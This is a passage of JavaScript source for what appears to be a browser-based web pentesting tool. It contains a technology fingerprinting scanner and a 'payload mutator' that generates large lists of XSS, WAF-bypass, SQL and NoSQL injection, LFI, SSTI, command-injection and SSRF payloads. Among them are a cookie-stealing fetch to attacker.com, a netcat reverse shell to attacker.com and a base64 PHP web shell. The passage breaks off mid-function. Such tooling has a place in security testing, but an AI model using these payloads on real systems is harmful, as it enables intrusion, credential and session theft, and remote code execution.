        if (g.echarts) { libs.push({ name: 'ECharts', version: null }); detected.add('ECharts'); }
        if (g.THREE) { libs.push({ name: 'Three.js', version: g.THREEVersion }); detected.add('Three.js'); }

        // === UI COMPONENTS ===
        if (g.Swiper) { libs.push({ name: 'Swiper', version: null }); detected.add('Swiper'); }
        if (g.Splide) { libs.push({ name: 'Splide', version: null }); detected.add('Splide'); }
        if (g.Slick) { libs.push({ name: 'Slick', version: null }); detected.add('Slick'); }
        if (g.Owl) { libs.push({ name: 'Owl Carousel', version: null }); detected.add('Owl Carousel'); }
        if (g.Lightbox) { libs.push({ name: 'Lightbox', version: null }); detected.add('Lightbox'); }
        if (g.Fancybox) { libs.push({ name: 'Fancybox', version: null }); detected.add('Fancybox'); }
        if (g.Hammer) { libs.push({ name: 'Hammer.js', version: null }); detected.add('Hammer.js'); }
        if (g.Popper) { libs.push({ name: 'Popper.js', version: null }); detected.add('Popper.js'); }
        if (g.Tippy) { libs.push({ name: 'Tippy.js', version: null }); detected.add('Tippy.js'); }
        if (g.SweetAlert) { libs.push({ name: 'SweetAlert2', version: null }); detected.add('SweetAlert2'); }
        if (g.Toastr) { libs.push({ name: 'Toastr', version: null }); detected.add('Toastr'); }
        if (g.Notyf) { libs.push({ name: 'Notyf', version: null }); detected.add('Notyf'); }

        // === EDITORS ===
        if (g.Monaco) { libs.push({ name: 'Monaco Editor', version: null }); detected.add('Monaco Editor'); }
        if (g.CodeMirror) { libs.push({ name: 'CodeMirror', version: g.CodeMirrorVersion }); detected.add('CodeMirror'); }
        if (g.Ace) { libs.push({ name: 'Ace Editor', version: null }); detected.add('Ace Editor'); }
        if (g.Quill) { libs.push({ name: 'Quill', version: null }); detected.add('Quill'); }
        if (g.TinyMCE) { libs.push({ name: 'TinyMCE', version: g.TinyMCEVersion }); detected.add('TinyMCE'); }
        if (g.CKEditor) { libs.push({ name: 'CKEditor', version: null }); detected.add('CKEditor'); }
        if (g.Prism) { libs.push({ name: 'Prism', version: null }); detected.add('Prism'); }
        if (g.hljs) { libs.push({ name: 'Highlight.js', version: null }); detected.add('Highlight.js'); }

        // === STATE MANAGEMENT ===
        if (g.Redux) { libs.push({ name: 'Redux', version: null }); detected.add('Redux'); }
        if (g.MobX) { libs.push({ name: 'MobX', version: null }); detected.add('MobX'); }
        if (g.Vuex) { libs.push({ name: 'Vuex', version: null }); detected.add('Vuex'); }
        if (g.Pinia) { libs.push({ name: 'Pinia', version: null }); detected.add('Pinia'); }
        if (g.Zustand) { libs.push({ name: 'Zustand', version: null }); detected.add('Zustand'); }
        if (g.Recoil) { libs.push({ name: 'Recoil', version: null }); detected.add('Recoil'); }

        // === MATH/SCIENTIFIC ===
        if (g.KaTeX) { libs.push({ name: 'KaTeX', version: g.KaTeXVersion }); detected.add('KaTeX'); }
        if (g.MathJax) { libs.push({ name: 'MathJax', version: g.MathJaxVersion }); detected.add('MathJax'); }

        // === ANALYTICS ===
        if (g.ga || g.dataLayer) { analytics.push({ name: 'Google Analytics', version: null }); detected.add('Google Analytics'); }
        if (g.dataLayer) { analytics.push({ name: 'Google Tag Manager', version: null }); detected.add('Google Tag Manager'); }
        if (g.fbq) { analytics.push({ name: 'Facebook Pixel', version: null }); detected.add('Facebook Pixel'); }
        if (g.hj) { analytics.push({ name: 'Hotjar', version: null }); detected.add('Hotjar'); }
        if (g.mixpanel) { analytics.push({ name: 'Mixpanel', version: null }); detected.add('Mixpanel'); }
        if (g.amplitude) { analytics.push({ name: 'Amplitude', version: null }); detected.add('Amplitude'); }
        if (g.analytics) { analytics.push({ name: 'Segment', version: null }); detected.add('Segment'); }
        if (g.posthog) { analytics.push({ name: 'PostHog', version: null }); detected.add('PostHog'); }
        if (g.heap) { analytics.push({ name: 'Heap', version: null }); detected.add('Heap'); }
        if (g.clarity) { analytics.push({ name: 'Microsoft Clarity', version: null }); detected.add('Microsoft Clarity'); }

        // === MARKETING/CHAT ===
        if (g.Intercom) { marketing.push({ name: 'Intercom', version: null }); detected.add('Intercom'); }
        if (g.Drift) { marketing.push({ name: 'Drift', version: null }); detected.add('Drift'); }
        if (g.Zendesk) { marketing.push({ name: 'Zendesk', version: null }); detected.add('Zendesk'); }
        if (g.Crisp) { marketing.push({ name: 'Crisp', version: null }); detected.add('Crisp'); }
        if (g.Tawk) { marketing.push({ name: 'Tawk.to', version: null }); detected.add('Tawk.to'); }
        if (g.HubSpot) { marketing.push({ name: 'HubSpot', version: null }); detected.add('HubSpot'); }

        // === SECURITY ===
        if (g.grecaptcha) { security.push({ name: 'reCAPTCHA', version: null }); detected.add('reCAPTCHA'); }
        if (g.hcaptcha) { security.push({ name: 'hCaptcha', version: null }); detected.add('hCaptcha'); }
        if (g.turnstile) { security.push({ name: 'Turnstile', version: null }); detected.add('Turnstile'); }

        // === ECOMMERCE ===
        if (g.Stripe) { ecommerce.push({ name: 'Stripe', version: null }); detected.add('Stripe'); }
        if (g.PayPal) { ecommerce.push({ name: 'PayPal', version: null }); detected.add('PayPal'); }

        // === BUILD TOOLS (Miscellaneous) ===
        if (g.webpackJsonp || g.__webpack_modules__) { misc.push({ name: 'Webpack', version: null }); detected.add('Webpack'); }
        if (g.parcelRequire) { misc.push({ name: 'Parcel', version: null }); detected.add('Parcel'); }
        if (g.System) { misc.push({ name: 'SystemJS', version: null }); detected.add('SystemJS'); }
        if (g.TypeScript) { misc.push({ name: 'TypeScript', version: null }); detected.add('TypeScript'); }

        // === UI FRAMEWORKS ===
        if (g.Tailwind) { ui.push({ name: 'Tailwind CSS', version: null }); detected.add('Tailwind CSS'); }
    }

    // === CDN / PAAS DETECTION FROM data.cdns ===
    if (data.cdns) {
        const paas = detections.PaaS || [];
        const misc = detections.Miscellaneous || [];
        if (data.cdns.s3) { paas.push({ name: 'Amazon S3', version: null }); detected.add('Amazon S3'); }
        if (data.cdns.cloudfront) { paas.push({ name: 'Amazon CloudFront', version: null }); detected.add('Amazon CloudFront'); }
        if (data.cdns.aws && !detected.has('Amazon S3') && !detected.has('Amazon CloudFront')) {
            paas.push({ name: 'Amazon Web Services', version: null }); detected.add('Amazon Web Services');
        }
        if (data.cdns.vercel) { paas.push({ name: 'Vercel', version: null }); detected.add('Vercel'); }
        if (data.cdns.netlify) { paas.push({ name: 'Netlify', version: null }); detected.add('Netlify'); }
        if (data.cdns.cloudflare) { misc.push({ name: 'Cloudflare', version: null }); detected.add('Cloudflare'); }
        if (data.cdns.firebase) { paas.push({ name: 'Firebase', version: null }); detected.add('Firebase'); }
        if (data.cdns.googleCloud) { paas.push({ name: 'Google Cloud', version: null }); detected.add('Google Cloud'); }
    }

    // === PROTOCOL DETECTION ===
    if (data.protocol) {
        const misc = detections.Miscellaneous || [];
        if (data.protocol === 'h2') { misc.push({ name: 'HTTP/2', version: null }); detected.add('HTTP/2'); }
        if (data.protocol === 'h3') { misc.push({ name: 'HTTP/3', version: null }); detected.add('HTTP/3'); }
    }

    // === PROGRAMMING LANGUAGES FROM GLOBALS ===
    if (data.globals?.Java) {
        const prog = detections['Programming languages'] || [];
        if (!detected.has('Java')) { prog.push({ name: 'Java', version: null }); detected.add('Java'); }
    }

    // === CMS DETECTION WITH VERSIONS FROM data.versions ===
    const cms = detections.CMS || [];
    if (v.WordPress && !detected.has('WordPress')) {
        cms.push({ name: 'WordPress', version: v.WordPress });
        detected.add('WordPress');
    }
    if (v.Drupal && !detected.has('Drupal')) {
        cms.push({ name: 'Drupal', version: v.Drupal !== 'detected' ? v.Drupal : null });
        detected.add('Drupal');
    }
    if (v.Joomla && !detected.has('Joomla')) {
        cms.push({ name: 'Joomla', version: v.Joomla });
        detected.add('Joomla');
    }
    if (v.TYPO3 && !detected.has('TYPO3')) {
        cms.push({ name: 'TYPO3', version: v.TYPO3 });
        detected.add('TYPO3');
    }
    if (v.Hugo && !detected.has('Hugo')) {
        cms.push({ name: 'Hugo', version: v.Hugo });
        detected.add('Hugo');
    }

    // Combine all sources for aggressive scanning
    const allScripts = [
        ...(data.scripts || []),
        ...(data.performance || []),
        ...(data.links || []).map(l => typeof l === 'object' ? l.href : l)
    ].filter(Boolean);

    const allContent = [
        data.html || '',
        ...(data.inlineScripts || []),
        data.bodyClasses || '',
        data.htmlClasses || ''
    ].join(' ');

    for (const [category, techs] of Object.entries(fingerprints)) {
        for (const [name, rules] of Object.entries(techs)) {
            if (detected.has(name)) continue;

            let found = false;
            let version = null;

            // Match HTML/DOM/Inline patterns (AGGRESSIVE)
            if (rules.html) {
                for (const pattern of rules.html) {
                    try {
                        const match = allContent.match(new RegExp(pattern, 'i'));
                        if (match) {
                            found = true;
                            // Try to extract version near the match
                            const versionMatch = match[0].match(/[\d]+\.[\d]+\.?[\d]*/);
                            if (versionMatch) version = versionMatch[0];
                            break;
                        }
                    } catch (e) { }
                }
            }

            // Match Meta Tags
            if (!found && rules.meta && data.meta) {
                for (const [mName, mValue] of Object.entries(rules.meta)) {
                    if (!mName || !mValue) continue;
                    const metaContent = data.meta[mName.toLowerCase()];
                    if (metaContent && typeof metaContent === 'string' && typeof mValue === 'string') {
                        if (metaContent.toLowerCase().includes(mValue.toLowerCase())) {
                            found = true;
                            const vMatch = metaContent.match(/[\d]+\.[\d]+\.?[\d]*/);
                            if (vMatch) version = vMatch[0];
                            break;
                        }
                    }
                }
            }

            // Match Scripts/Performance/Links (AGGRESSIVE)
            if (!found && rules.script) {
                for (const pattern of rules.script) {
                    try {
                        const regex = new RegExp(pattern, 'i');
                        for (const src of allScripts) {
                            if (regex.test(src)) {
                                found = true;
                                // Extract version from URL patterns like /1.2.3/ or -1.2.3. or @1.2.3
                                const vPatterns = [
                                    /[\/\-@](\d+\.\d+\.\d+)/,
                                    /[\/\-@]v?(\d+\.\d+)/,
                                    /[\-_](\d+\.\d+\.\d+)[\.\-_]/
                                ];
                                for (const vp of vPatterns) {
                                    const vMatch = src.match(vp);
                                    if (vMatch) { version = vMatch[1]; break; }
                                }
                                break;
                            }
                        }
                    } catch (e) { }
                    if (found) break;
                }
            }

            // Match Cookies
            if (!found && rules.cookies && data.cookies) {
                for (const cookieName of rules.cookies) {
                    try {
                        if (new RegExp(cookieName, 'i').test(data.cookies)) {
                            found = true;
                            break;
                        }
                    } catch (e) {
                        if (data.cookies.includes(cookieName)) {
                            found = true;
                            break;
                        }
                    }
                }
            }

            if (found && detections[category]) {
                detections[category].push({ name, version });
                detected.add(name);
            }
        }
    }

    // Store for Arsenal transfer
    lastTechScanResults = detections;

    renderTechResults(detections);
}

function renderTechResults(detections) {
    const resultsContainer = document.getElementById('techResults');
    const emptyState = document.getElementById('techEmptyState');
    const totalCountEl = document.getElementById('techTotalCount');

    let totalDetections = 0;
    let html = '';

    // Get all categories from fingerprints
    const categories = fingerprints ? Object.keys(fingerprints) : [];

    categories.forEach(cat => {
        const items = detections[cat] || [];
        if (items.length === 0) return;

        totalDetections += items.length;

        html += `
            <div class="tech-category">
                <div class="tech-category-header">
                    <span class="tech-category-title">${cat.toUpperCase()}</span>
                    <span class="tech-category-count">${items.length}</span>
                </div>
                <div class="tech-category-items">
                    ${items.map(t => `
                        <div class="tech-item" onclick="copyTechInfo('${t.name}', '${t.version || 'unknown'}')">
                            <div class="tech-item-main">
                                <span class="tech-item-name">${t.name}</span>
                                ${t.version ? `<span class="tech-item-version">${t.version}</span>` : '<span class="tech-item-version unknown">No version</span>'}
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    });

    // Update total count
    if (totalCountEl) {
        totalCountEl.textContent = totalDetections;
    }

    // Show/hide appropriate elements
    if (totalDetections === 0) {
        resultsContainer.innerHTML = '';
        resultsContainer.classList.add('hidden');
        emptyState.classList.remove('hidden');
    } else {
        resultsContainer.innerHTML = html;
        resultsContainer.classList.remove('hidden');
        emptyState.classList.add('hidden');
    }
}

// Copy tech info to clipboard
window.copyTechInfo = function (techName, version) {
    const text = version !== 'unknown' ? `${techName} ${version}` : techName;
    navigator.clipboard.writeText(text);
    showToast(`Copied: ${text}`);
};


// ===== PAYLOAD MUTATOR LOGIC =====
let mutationResults = [];

function setupMutatorEvents() {
    const backBtn = document.getElementById('backFromMutator');
    const mutateBtn = document.getElementById('mutateBtn');
    const clearBtn = document.getElementById('clearMutatorBtn');
    const copyAllBtn = document.getElementById('copyAllMutations');

    backBtn?.addEventListener('click', () => showScreen('tools'));
    mutateBtn?.addEventListener('click', performMutation);
    clearBtn?.addEventListener('click', clearMutator);
    copyAllBtn?.addEventListener('click', copyAllMutations);
}

function performMutation() {
    const input = document.getElementById('mutatorInput').value.trim();
    if (!input) {
        showToast('Masukkan payload terlebih dahulu');
        return;
    }

    const options = {
        xss: document.getElementById('mutXSS')?.checked,
        sqli: document.getElementById('mutSQLi')?.checked,
        encoding: document.getElementById('mutEncoding')?.checked,
        caseMutation: document.getElementById('mutCase')?.checked
    };

    mutationResults = generateMutations(input, options);
    renderMutations();
    showToast(`${mutationResults.length} mutasi dihasilkan!`);
}

function generateMutations(payload, options) {
    const mutations = new Set();
    mutations.add(payload); // Original

    // Safe base64 encoding that handles non-ASCII
    const safeBtoa = (str) => {
        try {
            return btoa(unescape(encodeURIComponent(str)));
        } catch (e) {
            return btoa('alert(1)'); // Fallback
        }
    };

    try {
        // === XSS MUTATIONS (from PayloadsAllTheThings) ===
        if (options.xss) {
            const code = extractCode(payload);

            // Basic event handlers - All HTML5 events
            const xssBasic = [
                `<script>${code}</script>`,
                `<script/src="data:,${code}">`,
                `<script>eval(atob('${safeBtoa(code)}'))</script>`,
                `<svg onload=${code}>`,
                `<svg/onload=${code}>`,
                `<svg onload="${code}">`,
                `<svg/onload="${code}"//`,
                `<svg onload=${code}//`,
                `<img src=x onerror=${code}>`,
                `<img/src=x/onerror=${code}>`,
                `<img src="x" onerror="${code}">`,
                `<img src=1 onerror=${code}>`,
                `<body onload=${code}>`,
                `<body onpageshow=${code}>`,
                `<body onfocus=${code}>`,
                `<body onhashchange=${code}>`,
                `<input onfocus=${code} autofocus>`,
                `<input onblur=${code} autofocus><input autofocus>`,
                `<textarea onfocus=${code} autofocus>`,
                `<select onfocus=${code} autofocus>`,
                `<marquee onstart=${code}>`,
                `<marquee onfinish=${code}>`,
                `<video><source onerror=${code}>`,
                `<video src=x onerror=${code}>`,
                `<audio src=x onerror=${code}>`,
                `<iframe onload=${code}>`,
                `<iframe src="javascript:${code}">`,
                `<iframe srcdoc="<script>${code}<\/script>">`,
                `<object data="javascript:${code}">`,
                `<embed src="javascript:${code}">`,
                `<details open ontoggle=${code}>`,
                `<meter onmouseover=${code}>0</meter>`,
                `<a href="javascript:${code}">click</a>`,
                `<a href=javascript:${code}>click</a>`,
                `<form action="javascript:${code}"><input type=submit>`,
                `<isindex action=javascript:${code} type=submit>`,
                `<keygen autofocus onfocus=${code}>`,
                `<xss id=x tabindex=1 onfocus=${code}></xss>`,
            ];

            // Advanced XSS - SVG/MathML (PayloadsAllTheThings)
            const xssSvgMath = [
                `<svg><script>/${code}</script>`,
                `<svg><script href="data:,${code}"/>`,
                `<svg><animate onbegin=${code}>`,
                `<svg><animate attributeName=x dur=1s repeatCount=2 onrepeat=${code}>`,
                `<svg><set onbegin=${code}>`,
                `<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">${code}</handler>`,
                `<svg><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:${code}"/>`,
                `<math><maction actiontype="statusline#${code}">click</maction>`,
                `<math><mtext><table><mglyph><style><img src=x onerror=${code}>`,
                `<svg><a><animate attributeName=href values=javascript:${code}><text x=20 y=20>click`,
                `<svg><use href="data:image/svg+xml,<svg id=x xmlns='http://www.w3.org/2000/svg'><script>${code}</script></svg>#x">`,
            ];

            // DOM-based XSS
            const xssDom = [
                `javascript:${code}`,
                `javascript:/**//${code}`,
                `javascript:eval(${code})`,
                `javascript:eval('${code}')`,
                `\x3cscript\x3e${code}\x3c/script\x3e`,
                `\u003cscript\u003e${code}\u003c/script\u003e`,
                `data:text/html,<script>${code}</script>`,
                `data:text/html;base64,${btoa(`<script>${code}</script>`)}`,
                `data:text/html;charset=utf-8,<script>${code}</script>`,
            ];

            // Polyglot XSS (works in multiple contexts)
            const xssPolyglot = [
                `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcLiCk=${code})//`,
                `'"><img src=x onerror=${code}>//'">`,
                `'"><svg onload=${code}>//'">`,
                `';${code}//`,
                `"-${code}-"`,
                `</script><script>${code}</script>`,
                `</title><script>${code}</script>`,
                `</textarea><script>${code}</script>`,
                `</style><script>${code}</script>`,
                `--><script>${code}</script>`,
                `]]><script>${code}</script>`,
            ];

            // WAF Bypass XSS (HackTricks)
            const xssWafBypass = [
                `<scr<script>ipt>${code}</scr</script>ipt>`,
                `<scr\x00ipt>${code}</scr\x00ipt>`,
                `<scr\nipt>${code}</scr\nipt>`,
                `<scr\tipt>${code}</scr\tipt>`,
                `<scr\ript>${code}</scr\ript>`,
                `<%73%63%72%69%70%74>${code}</%73%63%72%69%70%74>`,
                `<sCrIpT>${code}</sCrIpT>`,
                `<SCRIPT>${code}</SCRIPT>`,
                `<script >${code}</script >`,
                `<script//${code}//`,
                `<script x>${code}</script x>`,
                `<svg/onload=${code}//`,
                `<img/src/onerror=${code}>`,
                `<img\tsrc=x\tonerror=${code}>`,
                `<img\nsrc=x\nonerror=${code}>`,
                `<img\rsrc=x\ronerror=${code}>`,
                `<IMG """><SCRIPT>${code}</SCRIPT>">`,
                `<<SCRIPT>${code}//<</SCRIPT>`,
                `<script>eval(String.fromCharCode(${code.split('').map(c => c.charCodeAt(0)).join(',')}))</script>`,
            ];

            // Blind XSS payloads
            const xssBlind = [
                `<script src=https://xss.ht></script>`,
                `'"><script src=https://xss.ht></script>`,
                `<img src=x onerror="var s=document.createElement('script');s.src='https://xss.ht';document.body.appendChild(s);">`,
                `<svg onload="fetch('https://attacker.com/?c='+document.cookie)">`,
            ];

            [...xssBasic, ...xssSvgMath, ...xssDom, ...xssPolyglot, ...xssWafBypass, ...xssBlind].forEach(p => mutations.add(p));

            // Event variations
            const allEvents = ['onload', 'onerror', 'onclick', 'onmouseover', 'onmouseenter', 'onmousemove',
                'onfocus', 'onblur', 'onchange', 'onsubmit', 'onkeyup', 'onkeydown', 'onkeypress',
                'ondblclick', 'oncontextmenu', 'onwheel', 'ondrag', 'ondrop', 'oncopy', 'oncut', 'onpaste',
                'onscroll', 'onresize', 'oninput', 'oninvalid', 'onselect', 'ontouchstart', 'ontouchmove',
                'onpointerover', 'onpointerenter', 'ongotpointercapture', 'onbeforeinput'];
            allEvents.forEach(ev => {
                mutations.add(`<div ${ev}=${code}>X</div>`);
                mutations.add(`<img src=x ${ev}=${code}>`);
            });

            // Template literal variations
            if (code.includes('(')) {
                const funcName = code.match(/(\w+)\(/)?.[1] || 'alert';
                mutations.add(`<script>${funcName}\`1\`</script>`);
                mutations.add(`<script>[].constructor.constructor('${code}')()</script>`);
                mutations.add(`<script>Function('${code}')()</script>`);
                mutations.add(`<script>eval.call\`${'${' + code + '}'}\`</script>`);
                mutations.add(`<script>setTimeout('${code}',0)</script>`);
                mutations.add(`<script>setInterval('${code}',0)</script>`);
            }
        }

        // === SQLi MUTATIONS (from sqlmapproject/PayloadsAllTheThings) ===
        if (options.sqli) {
            // Authentication Bypass
            const sqliAuth = [
                `' OR '1'='1`,
                `' OR '1'='1'--`,
                `' OR '1'='1'#`,
                `' OR '1'='1'/*`,
                `" OR "1"="1`,
                `" OR "1"="1"--`,
                `") OR ("1"="1`,
                `') OR ('1'='1`,
                `admin'--`,
                `admin'#`,
                `admin'/*`,
                `admin' or '1'='1`,
                `admin' or '1'='1'--`,
                `admin' or '1'='1'#`,
                `' OR 1=1--`,
                `' OR 1=1#`,
                `' OR 1=1/*`,
                `" OR 1=1--`,
                `" OR 1=1#`,
                `or 1=1--`,
                `or 1=1#`,
                `' or ''='`,
                `" or ""="`,
                `' or 'x'='x`,
                `" or "x"="x`,
                `') or ('x'='x`,
                `") or ("x"="x`,
                `1' or '1'='1`,
                `1" or "1"="1`,
            ];

            // Union-based SQLi
            const sqliUnion = [
                `' UNION SELECT NULL--`,
                `' UNION SELECT NULL,NULL--`,
                `' UNION SELECT NULL,NULL,NULL--`,
                `' UNION SELECT 1,2,3--`,
                `' UNION SELECT 1,2,3,4--`,
                `' UNION SELECT 1,2,3,4,5--`,
                `' UNION ALL SELECT 1,2,3--`,
                `' UNION SELECT @@version--`,
                `' UNION SELECT user()--`,
                `' UNION SELECT database()--`,
                `' UNION SELECT table_name FROM information_schema.tables--`,
                `' UNION SELECT column_name FROM information_schema.columns--`,
                `1' UNION SELECT NULL--`,
                `1 UNION SELECT NULL--`,
                `" UNION SELECT NULL--`,
                `') UNION SELECT NULL--`,
                `")) UNION SELECT NULL--`,
                `' UNION SELECT NULL,NULL,NULL,NULL FROM dual--`,
            ];

            // Time-based Blind SQLi
            const sqliTime = [
                `' AND SLEEP(5)--`,
                `' AND SLEEP(5)#`,
                `" AND SLEEP(5)--`,
                `'; WAITFOR DELAY '0:0:5'--`,
                `"; WAITFOR DELAY '0:0:5'--`,
                `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,
                `' AND BENCHMARK(10000000,SHA1('test'))--`,
                `1' AND SLEEP(5)--`,
                `1 AND SLEEP(5)--`,
                `' OR SLEEP(5)--`,
                `1; SELECT SLEEP(5)--`,
                `1; SELECT pg_sleep(5)--`,
                `'||pg_sleep(5)--`,
                `'; SELECT pg_sleep(5)--`,
                `'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'`,
                `' AND 1=IF(1=1,SLEEP(5),0)--`,
                `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SLEEP(5))))--`,
            ];

            // Error-based SQLi
            const sqliError = [
                `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--`,
                `' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--`,
                `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
                `' AND EXP(~(SELECT * FROM(SELECT version())x))--`,
                `' AND 1=CONVERT(int,(SELECT @@version))--`,
                `' AND 1=CAST(version() AS int)--`,
                `'; EXEC xp_cmdshell('whoami')--`,
            ];

            // Boolean-based Blind SQLi  
            const sqliBool = [
                `' AND 1=1--`,
                `' AND 1=2--`,
                `' AND 'a'='a`,
                `' AND 'a'='b`,
                `' AND substring(version(),1,1)='5`,
                `' AND (SELECT COUNT(*) FROM users)>0--`,
                `' AND (SELECT LENGTH(database()))=5--`,
                `' AND ASCII(SUBSTRING(database(),1,1))>64--`,
            ];

            // NoSQL Injection (MongoDB)
            const nosqli = [
                `{"$gt":""}`,
                `{"$ne":""}`,
                `{"$gt":undefined}`,
                `{"$ne":null}`,
                `{"$where":"1==1"}`,
                `{"$regex":".*"}`,
                `true, $where: '1 == 1'`,
                `'; return 1==1; //`,
                `'; return this.password; //`,
                `{$regex: "^A"}`,
                `{$gt: ""}`,
            ];

            // WAF Bypass SQLi
            const sqliBypass = [
                `'/**/OR/**/1=1--`,
                `'/**/UNION/**/SELECT/**/1,2,3--`,
                `'/*!50000OR*/1=1--`,
                `'+OR+1=1--`,
                `'%0aOR%0a1=1--`,
                `'%0dOR%0d1=1--`,
                `'%09OR%091=1--`,
                `'%00OR%001=1--`,
                `' oR 1=1--`,
                `' Or 1=1--`,
                `' OR/**/1=1--`,
                `'||1=1--`,
                `' && 1=1--`,
                `' ^1=1--`,
                `'<>1=1--`,
            ];

            [...sqliAuth, ...sqliUnion, ...sqliTime, ...sqliError, ...sqliBool, ...nosqli, ...sqliBypass].forEach(p => mutations.add(p));

            // Original with SQLi suffixes
            mutations.add(`${payload}'`);
            mutations.add(`${payload}"`);
            mutations.add(`${payload}\``);
            mutations.add(`${payload}' OR '1'='1`);
            mutations.add(`${payload}" OR "1"="1`);
            mutations.add(`${payload}'--`);
            mutations.add(`${payload}'#`);
        }

        // === ENCODING MUTATIONS ===
        if (options.encoding) {
            // URL Encoding
            mutations.add(encodeURIComponent(payload));
            mutations.add(doubleUrlEncode(payload));
            mutations.add(tripleUrlEncode(payload));

            // HTML Entities
            mutations.add(htmlEncode(payload));
            mutations.add(htmlDecimalEncode(payload));
            mutations.add(htmlHexEncode(payload));
            mutations.add(htmlMixedEncode(payload));

            // Unicode variations
            mutations.add(unicodeEncode(payload));
            mutations.add(utf7Encode(payload));
            mutations.add(utf16Encode(payload));

            // Base64
            mutations.add(btoa(payload));
            mutations.add(`data:text/html;base64,${btoa(payload)}`);
            mutations.add(`data:text/html;base64,${btoa(`<script>${extractCode(payload)}</script>`)}`);

            // Hex encoding
            mutations.add(hexEncode(payload));
            mutations.add(hexEncodeJs(payload));

            // Octal encoding
            mutations.add(octalEncode(payload));

            // Mixed encoding (bypass filters)
            mutations.add(payload.split('').map((c, i) => i % 2 === 0 ? encodeURIComponent(c) : c).join(''));
            mutations.add(payload.split('').map((c, i) => i % 3 === 0 ? `&#${c.charCodeAt(0)};` : c).join(''));

            // JSFuck style
            mutations.add(`[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]`); // Just a sample
        }

        // === CASE MUTATIONS ===
        if (options.caseMutation) {
            mutations.add(payload.toLowerCase());
            mutations.add(payload.toUpperCase());
            mutations.add(randomCase(payload));
            mutations.add(alternateCase(payload));
            mutations.add(invertCase(payload));
            mutations.add(capitalizeWords(payload));
        }

        // === LFI PAYLOADS (always add some bypass techniques) ===
        const lfiPayloads = [
            `../../../etc/passwd`,
            `....//....//....//etc/passwd`,
            `..%252f..%252f..%252fetc/passwd`,
            `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`,
            `/etc/passwd%00`,
            `....\/....\/....\/etc/passwd`,
            `..%c0%af..%c0%af..%c0%afetc/passwd`,
            `php://filter/convert.base64-encode/resource=index.php`,
            `php://input`,
            `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`,
            `expect://id`,
        ];
        lfiPayloads.forEach(p => mutations.add(p));

        // === SSTI PAYLOADS (Server-Side Template Injection) ===
        const sstiPayloads = [
            `{{7*7}}`,
            `${7 * 7}`,
            `<%= 7*7 %>`,
            `#{7*7}`,
            `*{7*7}`,
            `{{config}}`,
            `{{self.__init__.__globals__}}`,
            `{{request.application.__globals__.__builtins__}}`,
            `${T(java.lang.Runtime).getRuntime().exec('id')}`,
            `{{''.__class__.__mro__[2].__subclasses__()}}`,
            `{{''.class.mro[2].subclasses()}}`,
            `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
        ];
        sstiPayloads.forEach(p => mutations.add(p));

        // === COMMAND INJECTION ===
        const cmdPayloads = [
            `; id`,
            `| id`,
            `|| id`,
            `& id`,
            `&& id`,
            `\`id\``,
            `$(id)`,
            `; cat /etc/passwd`,
            `| cat /etc/passwd`,
            `\nid`,
            `%0Aid`,
            `; sleep 5`,
            `| sleep 5`,
            `& ping -c 5 127.0.0.1`,
            `; nc -e /bin/sh attacker.com 4444`,
        ];
        cmdPayloads.forEach(p => mutations.add(p));

        // === SSRF PAYLOADS ===
        const ssrfPayloads = [
            `http://127.0.0.1`,
            `http://localhost`,
            `http://[::1]`,
            `http://0.0.0.0`,
            `http://127.0.0.1:80`,
            `http://127.0.0.1:443`,
            `http://127.0.0.1:22`,
            `http://169.254.169.254/latest/meta-data/`,
            `http://metadata.google.internal/`,
            `file:///etc/passwd`,
            `dict://localhost:11211/`,
            `gopher://localhost:6379/_INFO`,
        ];
        ssrfPayloads.forEach(p => mutations.add(p));

        // === BYPASS MUTATIONS (always include) ===
        // Null bytes
        mutations.add(payload.replace(/<script>/gi, '<scr%00ipt>'));
        mutations.add(payload.replace(/<script>/gi, '<scr\x00ipt>'));
        mutations.add(payload.replace(/<script>/gi, '<scr\u0000ipt>'));

        // Newlines, tabs, carriage returns
        mutations.add(payload.replace(/<script>/gi, '<script\n>'));
        mutations.add(payload.replace(/<script>/gi, '<script\t>'));
        mutations.add(payload.replace(/<script>/gi, '<script\r\n>'));
        mutations.add(payload.replace(/<script>/gi, '<script >'));
        mutations.add(payload.replace(/<script>/gi, '< script>'));

        // Comments
        mutations.add(payload.replace(/<script>/gi, '<scr<!--ipt>'));
        mutations.add(payload.replace(/javascript:/gi, 'java/**/script:'));
        mutations.add(payload.replace(/ /g, '/**/'));

        // Case variations
        mutations.add(payload.replace(/<script>/gi, '<SCRIPT>').replace(/<\/script>/gi, '</SCRIPT>'));
        mutations.add(payload.replace(/<script>/gi, '<ScRiPt>').replace(/<\/script>/gi, '</ScRiPt>'));
        mutations.add(payload.replace(/<script>/gi, '<sCrIpT>').replace(/<\/script>/gi, '</sCrIpT>'));

    } catch (e) {
        console.error('Mutation generation error:', e);
    }

    return Array.from(mutations).filter(m => m !== payload); // Exclude original
}

function extractCode(payload) {
    // Extract JavaScript code from various formats
    const match = payload.match(/<script>([^<]*)<\/script>/i) ||
        payload.match(/javascript:(.+)/i) ||
        payload.match(/on\w+=["']?([^"'>\s]+)/i);
    return match ? match[1] : (payload.includes('alert') ? payload : 'alert(1)');
}

function doubleUrlEncode(str) {
    return encodeURIComponent(encodeURIComponent(str));
}

function tripleUrlEncode(str) {
    return encodeURIComponent(encodeURIComponent(encodeURIComponent(str)));
}

function htmlEncode(str) {
    return str.replace(/[<>&"']/g, c => ({
        '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;'
    }[c]));
}

function htmlDecimalEncode(str) {
    return str.split('').map(c => `&#${c.charCodeAt(0)};`).join('');
}

function htmlHexEncode(str) {
